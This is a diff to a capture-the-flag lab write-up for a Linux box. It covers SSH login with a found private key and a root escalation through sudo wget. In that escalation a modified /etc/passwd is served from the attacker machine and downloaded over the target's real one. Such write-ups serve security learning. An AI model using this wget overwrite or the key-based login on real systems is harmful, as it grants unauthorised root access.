@@ -1,4 +1,4 @@
-#Windows #...... #S.........
+#Linux #Wget #
 
 **NMAP Scan**
 
@@ -48,7 +48,37 @@ A further **Gobuster** search on `http://10.10.207.235/sitemap` suggests a hidde
 
 ![image](https://user-images.githubusercontent.com/99097743/171082095-e325cb85-02a7-4028-a57d-dc2dbafa9d4d.png)
 
+What we need to do now are:
+
+1) Change file permissions for the id_rsa as `chmod 600 jessie_id_rsa`
+2) Login ssh using the private key: `ssh -i path/to/key_file username@remote_host`
+
+We can assume that the private keys belongs to Jessie -- This name was mentioned in a comment line in website source code (see abobe)
+
+![image](https://user-images.githubusercontent.com/99097743/171085363-81619d9f-110a-4f47-b960-14ecb9ad9df5.png)
+
+We now have the user flag captured, let's explore the vulnerabilities for privilege escalation, let's try `sudo -l` to see the allowed commands
+
+![image](https://user-images.githubusercontent.com/99097743/171085848-4e010d8f-f21b-457f-be9c-ed7303f629d3.png)
+
+It seems that we can use GTFOBins Wget vulnerability as explained here: https://gtfobins.github.io/gtfobins/wget/
+
+![image](https://user-images.githubusercontent.com/99097743/171088818-d8ec1a56-82cc-4aaf-a0c9-ee43117274e3.png)
+
+Here are steps that can be followed:
+
+1) Copy `etc/passwd` in the local host, generate a password for the root account, and include it as password hash in passwd:
+
+![image](https://user-images.githubusercontent.com/99097743/171087622-38672abd-b16e-44e2-a833-1db586e0030a.png)
+
+![image](https://user-images.githubusercontent.com/99097743/171089509-76761a52-80ba-430a-b7df-d7d6b6e8d64a.png)
 
 
+2) Open an HTTP server on the local host: `sudo python3 -m http.server 80`
 
+3) Transfer the passwd to target machine: `sudo wget http://10.18.123.93/passwd -O /etc/passwd`
+
+![image](https://user-images.githubusercontent.com/99097743/171089684-54d7a62a-9d2a-42b3-b205-8b1655981162.png)
+
+4) Elevate to root: `su root` -- Password above
 
